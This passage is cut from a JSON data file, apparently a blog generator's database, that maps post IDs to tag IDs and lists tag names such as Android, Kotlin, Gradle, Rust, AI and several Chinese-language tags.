66b635q9x","tag_id":"cluaufh0c0009the6cq0l5n4c","_id":"cluaufh1u0081the6dt41d952"},{"post_id":"cluaufh1q005kthe64mbyc4rr","tag_id":"cluaufh0c0009the6cq0l5n4c","_id":"cluaufh1u0082the6eejkc2pz"},{"post_id":"cluaufh1q005kthe64mbyc4rr","tag_id":"cluaufh0z002fthe61xueeu26","_id":"cluaufh1u0083the63yorfjdp"},{"post_id":"cluaufh1r005nthe6dg2adzb1","tag_id":"cluaufh19003lthe63sp93mzz","_id":"cluaufh1u0084the6fir4hgbk"},{"post_id":"cluaufh1r005nthe6dg2adzb1","tag_id":"cluaufh0z002fthe61xueeu26","_id":"cluaufh1u0085the64c5w7evq"},{"post_id":"cluaufh1r005nthe6dg2adzb1","tag_id":"cluaufh0c0009the6cq0l5n4c","_id":"cluaufh1u0086the62o115efq"},{"post_id":"cluaufh18003kthe63dwbg8bc","tag_id":"cluaufh10002lthe6d440egls","_id":"cluaufh1u0087the6e1rmbf33"},{"post_id":"cluaufh18003kthe63dwbg8bc","tag_id":"cluaufh1n0055the6bndq0mj8","_id":"cluaufh1u0088the638pt62ce"},{"post_id":"cluaufh1r005pthe64rrm95t6","tag_id":"cluaufh0c0009the6cq0l5n4c","_id":"cluaufh1u0089the6apnp4bho"},{"post_id":"cluaufh1r005pthe64rrm95t6","tag_id":"cluaufh0m0010the69kabazgw","_id":"cluaufh1u008athe6fys5f7k4"},{"post_id":"cluaufh1r005pthe64rrm95t6","tag_id":"cluaufh0z002fthe61xueeu26","_id":"cluaufh1u008bthe6ewzh2fa0"},{"post_id":"cluaufh1r005pthe64rrm95t6","tag_id":"cluaufh10002lthe6d440egls","_id":"cluaufh1u008cthe6fb4zb5ja"},{"post_id":"cluaufh1e003zthe66spn8gnv","tag_id":"cluaufh1e0041the654iu3i3k","_id":"cluaufh1v008dthe6cgewdcd7"},{"post_id":"cluaufh1e003zthe66spn8gnv","tag_id":"cluaufh080004the66qw0gkt8","_id":"cluaufh1v008ethe66yvndiui"},{"post_id":"cluaufh1j004mthe6084580vc","tag_id":"cluaufh0c0009the6cq0l5n4c","_id":"cluaufh1v008fthe60i93elve"},{"post_id":"cluaufh1j004mthe6084580vc","tag_id":"cluaufh1s005tthe696uo2dwl","_id":"cluaufh1v008gthe68mqg4kro"}],"Tag":[{"name":"问题不大","_id":"cluaufh080004the66qw0gkt8"},{"name":"Android","_id":"cluaufh0c0009the6cq0l5n4c"},{"name":"AOSP","_id":"cluaufh0g000hthe6bxc4c4gb"},{"name":"Java","_id":"cluaufh0m0010the69kabazgw"},{"name":"后端","_id":"cluaufh0q001fthe69osig4df"},{"name":"前端","_id":"cluaufh0y002athe64k7h08gd"},{"name":"Kotlin","_id":"cluaufh0z002fthe61xueeu26"},{"name":"鼓捣折腾","_id":"cluaufh10002lthe6d440egls"},{"name":"Linux","_id":"cluaufh11002qthe6fwua9tm3"},{"name":"Gradle","_id":"cluaufh19003lthe63sp93mzz"},{"name":"Windows","_id":"cluaufh1b003vthe65qhxg7rr"},{"name":"AI","_id":"cluaufh1e0041the654iu3i3k"},{"name":"macOS","_id":"cluaufh1n0055the6bndq0mj8"},{"name":"算法","_id":"cluaufh1p005bthe61ua7a77i"},{"name":"Rust","_id":"cluaufh1s005tthe696uo2dwl"}]}}